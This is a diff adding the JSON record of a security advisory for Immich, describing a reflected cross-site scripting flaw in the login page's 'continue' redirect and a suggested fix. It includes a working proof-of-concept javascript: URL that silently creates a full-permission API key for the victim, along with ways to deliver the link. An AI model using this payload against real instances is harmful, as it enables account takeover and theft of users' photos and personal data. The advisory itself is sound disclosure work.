@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-8244-8vpr-vp9c",
+  "repo": {
+    "cve_id": "CVE-2026-53662",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.6,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-601",
+      "CWE-79"
+    ],
+    "description": "**Affected:** `main` branch builds since commit `4ffa26c9` (PR #27831, merged 2026-04-15), including the `:main` Docker tag and any nightly. **No tagged release is affected** - v2.7.5 (the current stable) and earlier are safe.\r\n\r\n**Patched in:** not yet patched; the bug currently sits on `main` and will ship in the next tagged release unless fixed before then.\r\n\r\n### Summary\r\n\r\nA reflected cross-site scripting (XSS) vulnerability on the `/auth/login` page allows an attacker to fully compromise any authenticated user's account with a single link click. The `continue` query parameter is read from the URL and passed to SvelteKit's `redirect()` without any scheme or origin validation, allowing attacker-controlled JavaScript to execute inside Immich's origin. The payload then uses the victim's existing session to mint an `all`-permission API key on their account, leading to persistent account takeover.\r\n\r\n### Details\r\n\r\nIn `web/src/routes/auth/login/+page.ts` (introduced by PR #27831, commit `4ffa26c9`, 2026-04-15):\r\n\r\n```ts\r\nconst continueUrl = url.searchParams.get('continue') || Route.photos();\r\nif (authManager.authenticated) {\r\n  redirect(307, continueUrl);\r\n}\r\n```\r\n\r\nThe `continue` value is taken from the URL and handed directly to `redirect()`. SvelteKit's `redirect()` performs no validation on the destination, and the client-side runtime ultimately resolves the redirect via `location.href = url.href` inside `native_navigation`. For a `javascript:` URL, this causes the browser to evaluate the JS expression in Immich's origin, with the victim's session cookie attached automatically to any subsequent same-origin request.\r\n\r\nBecause the cookies are `HttpOnly`, the attacker does not need to read them - the browser attaches them to any `fetch('/api/...')` the injected script makes.\r\n\r\n### PoC\r\n\r\n\r\n1. Run a vulnerable Immich (any build from `main` since 2026-04-15, e.g. the `ghcr.io/immich-app/immich-server:main` Docker tag).\r\n2. As the victim, log in normally.\r\n3. Cause the victim to visit (chat, email, hidden iframe, link shortener) - replace `<immich-host>` with the real hostname of the target instance:\r\n\r\n```\r\nhttp://<immich-host>/auth/login?continue=javascript:fetch('/api/api-keys',{method:'POST',headers:{'content-type':'application/json'},body:'{\"name\":\"pwned\",\"permissions\":[\"all\"]}'}).then(r=>r.json()).then(d=>{alert('PWNED\\nSECRET='.concat(d.secret));window.__pwned=d});void(0)\r\n```\r\n\r\n<img width=\"1470\" height=\"691\" alt=\"Screenshot 2026-05-11 at 9 21 27 PM\" src=\"https://github.com/user-attachments/assets/9ee49238-7949-4391-8bde-2dc22ef64f57\" />\r\nObserved in a real browser (Chrome, latest):\r\n\r\n- The browser navigates to `/auth/login?continue=…`.\r\n- A native alert dialog pops, reading:\r\n\r\n```\r\nPWNED\r\nSECRET=<a working, full-permission API key>\r\n```\r\n\r\n- DevTools → Network shows a real `POST /api/api-keys` with `{\"name\":\"pwned\",\"permissions\":[\"all\"]}`, response 201.\r\n- The new key appears in Account Settings → API Keys, named `pwned`, with the full permission list checked.\r\n- The captured secret authenticates against `/api/users/me` from any host via the `x-api-key` header, proving the access is persistent across logout, password change, and session expiry.\r\n\r\nVerified end-to-end on 2026-05-11 against `ghcr.io/immich-app/immich-server:main`.\r\n\r\n### Impact\r\n\r\n- **Type:** Reflected XSS leading to full account takeover.\r\n- **Precondition:** Victim is authenticated at the time of the click. Immich sessions persist for long periods, so this is satisfied for typical users.\r\n- **What an attacker obtains:** A persistent, full-permission API key on the victim's account. Works from any machine on the internet that can reach the Immich instance. Survives logout, password rotation, and session expiry. Can only be revoked by manually deleting it from Account Settings → API Keys.\r\n- **Concrete capabilities:** read/delete every photo and video, modify settings, change email/password, exfiltrate face and GPS data, invite the attacker into shared albums. If the victim is an admin, modify global instance settings and lock the real admin out.\r\n\r\n### Suggested fix\r\n\r\nValidate that `continueUrl` is a same-origin relative path before passing it to `redirect()`:\r\n\r\n```ts\r\nconst raw = url.searchParams.get('continue');\r\nconst continueUrl =\r\n  raw && raw.startsWith('/') && !raw.startsWith('//')\r\n    ? raw\r\n    : Route.photos();\r\n```\r\n\r\n- `startsWith('/')`\r\n keeps the destination inside the app.\r\n- `!startsWith('//')` blocks protocol-relative URLs like `//evil.com`.\r\n- Together, this rejects `javascript:`, `data:`, `https://evil.com`, and `//evil.com`.\r\n\r\nApply the same check to `web/src/routes/auth/pin-prompt/+page.ts` for consistency - that sink is currently neutralized by a different SvelteKit guard but would benefit from the same allow-list.\r\n",
+    "ghsa_id": "GHSA-8244-8vpr-vp9c",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-8244-8vpr-vp9c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-8244-8vpr-vp9c"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-53662"
+      }
+    ],
+    "published_at": "2026-06-01T17:46:22Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "One-click account takeover via XSS in login page continue redirect",
+    "updated_at": "2026-06-10T17:21:27Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "docker",
+          "name": "immich-server"
+        },
+        "patched_versions": "> main@4eb1003",
+        "vulnerable_version_range": "> main@4ffa26c9"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
